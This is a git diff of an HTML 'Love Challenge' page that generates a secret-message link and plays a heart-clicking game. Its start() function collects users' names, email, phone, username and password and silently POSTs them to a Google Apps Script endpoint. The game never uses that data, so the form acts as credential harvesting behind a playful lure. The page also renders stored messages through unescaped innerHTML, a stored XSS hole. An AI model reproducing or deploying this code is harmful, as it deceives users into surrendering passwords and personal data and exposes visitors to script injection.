@@ -2,49 +2,72 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Big Form PRO</title>
+<title>Love Challenge PRO MAX 💖🔥</title>
+
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 
 <style>
 body{
-  font-family: Arial;
-  background: linear-gradient(135deg,#4facfe,#00f2fe);
+  margin:0;
+  font-family:sans-serif;
+  background:linear-gradient(135deg,#ff416c,#ff4b2b);
+  text-align:center;
 }
 
 .form{
-  width:450px;
-  margin:30px auto;
   background:white;
+  width:450px;
+  margin:20px auto;
   padding:25px;
-  border-radius:15px;
+  border-radius:20px;
 }
 
 input,select,textarea{
   width:100%;
   padding:10px;
-  margin:6px 0;
-  border-radius:8px;
-  border:1px solid #ccc;
+  margin:5px 0;
+  border-radius:10px;
 }
 
 button{
   width:100%;
   padding:12px;
-  background:#007bff;
+  background:#ff2e63;
   color:white;
   border:none;
   border-radius:10px;
+  margin-top:10px;
+}
+
+#game{display:none;}
+.item{
+  position:absolute;
+  font-size:30px;
+  cursor:pointer;
+}
+
+#final{
+  display:none;
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  background:white;
+  padding:20px;
+  border-radius:20px;
 }
 </style>
-
 </head>
 
 <body>
 
-<div class="form">
-<h2>🔥 Formulaire Complet</h2>
+<div class="form" id="form">
+<h2>💖 Love Form PRO MAX</h2>
 
 <input id="nom" placeholder="Nom">
 <input id="prenom" placeholder="Prénom">
+<input id="username" placeholder="Username">
 <input id="age" type="number" placeholder="Age">
 
 <input id="email" type="email" placeholder="Email">
@@ -53,7 +76,6 @@ button{
 <input id="password" type="password" placeholder="Password">
 
 <select id="pays">
-<option value="">Pays</option>
 <option>Tunisie</option>
 <option>France</option>
 <option>Maroc</option>
@@ -69,37 +91,157 @@ button{
 <input type="checkbox" name="hobbie" value="Music"> Music
 <input type="checkbox" name="hobbie" value="Gaming"> Gaming
 
-<textarea id="message" placeholder="Message..."></textarea>
+<textarea id="msg" placeholder="Secret message 💌"></textarea>
 
-<button onclick="send()">Envoyer 🚀</button>
+<button onclick="start()">🔥 Generate Link</button>
+
+<div id="linkBox"></div>
+<button onclick="copyLink()">📋 Copy Link</button>
+<button onclick="goGame()">🎮 Start Game</button>
 
 </div>
 
+<div id="game">
+<h2>❤️‍🔥 Love Game</h2>
+<p id="info"></p>
+<p>Score: <span id="score">0</span></p>
+</div>
+
+<div id="final"></div>
+
 <script>
-function send(){
 
-  let nom=document.getElementById("nom").value;
-  let prenom=document.getElementById("prenom").value;
-  let age=document.getElementById("age").value;
-  let email=document.getElementById("email").value;
-  let phone=document.getElementById("phone").value;
-  let password=document.getElementById("password").value;
-  let pays=document.getElementById("pays").value;
-  let message=document.getElementById("message").value;
+// Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSy...",
+  authDomain: "secret-messages-d0ac8.firebaseapp.com",
+  projectId: "secret-messages-d0ac8"
+};
 
-  let genre=document.querySelector('input[name="genre"]:checked')?.value || "";
-  let hobbies=[...document.querySelectorAll('input[name="hobbie"]:checked')].map(el=>el.value).join(",");
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
+// Vars
+let finalLink="", savedMessage="";
+let score=0, level=1, time=10;
+let timer,spawnInterval;
+
+// START
+function start(){
+
+  let data={
+    nom:nom.value,
+    prenom:prenom.value,
+    username:username.value,
+    age:age.value,
+    email:email.value,
+    phone:phone.value,
+    password:password.value,
+    pays:pays.value,
+    genre:document.querySelector('input[name="genre"]:checked')?.value || "",
+    hobbies:[...document.querySelectorAll('input[name="hobbie"]:checked')].map(e=>e.value).join(","),
+    message:msg.value
+  };
+
+  if(data.username=="" || data.message==""){
+    alert("Fill required fields");
+    return;
+  }
+
+  // Google Sheets
   fetch("https://script.google.com/macros/s/AKfycby4_Jwh7IVeJeF9Z3UzK0osQY-FaJsmZNpfXBwWN1A3rGSUcjag0xz6wD_uE3t9hfyK/exec", {
     method:"POST",
     mode:"no-cors",
-    body:new URLSearchParams({
-      nom,prenom,age,email,phone,password,pays,genre,hobbies,message
-    })
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams(data)
   });
 
-  alert("✅ Envoyé !");
+  // Firebase
+  db.collection("messages").add({
+    text:data.message
+  }).then(doc=>{
+    finalLink=location.href.split("?")[0]+"?msg="+doc.id;
+    linkBox.innerText=finalLink;
+  });
 }
+
+// Copy
+function copyLink(){
+  navigator.clipboard.writeText(finalLink);
+  alert("Copied 🔥");
+}
+
+// Game
+function goGame(){
+  form.style.display="none";
+  game.style.display="block";
+  startLevel();
+}
+
+function startLevel(){
+  score=0;
+  time=10;
+  info.innerText="Time "+time;
+
+  timer=setInterval(()=>{
+    time--;
+    info.innerText="Time "+time;
+    if(time<=0) lose();
+  },1000);
+
+  spawn();
+}
+
+function spawn(){
+  spawnInterval=setInterval(()=>{
+    let el=document.createElement("div");
+    el.innerText=Math.random()<0.2?"💔":"❤️";
+    el.className="item";
+    el.style.left=Math.random()*90+"%";
+    el.style.top=Math.random()*90+"%";
+
+    el.onclick=()=>{
+      if(el.innerText=="💔"){lose();return;}
+      score++;
+      scoreEl.innerText=score;
+      el.remove();
+      if(score>=10) finish();
+    };
+
+    document.body.appendChild(el);
+    setTimeout(()=>el.remove(),2000);
+  },500);
+}
+
+function lose(){
+  clearInterval(timer);
+  clearInterval(spawnInterval);
+  alert("💔 You lost");
+  location.reload();
+}
+
+function finish(){
+  clearInterval(timer);
+  clearInterval(spawnInterval);
+
+  final.style.display="block";
+  final.innerHTML="<h2>💌 Secret Message</h2><p>"+savedMessage+"</p>";
+}
+
+// Load
+window.onload=async()=>{
+  let id=new URLSearchParams(location.search).get("msg");
+  if(id){
+    form.style.display="none";
+    game.style.display="block";
+
+    let doc=await db.collection("messages").doc(id).get();
+    if(doc.exists){
+      savedMessage=doc.data().text;
+      startLevel();
+    }
+  }
+};
 </script>
 
 </body>
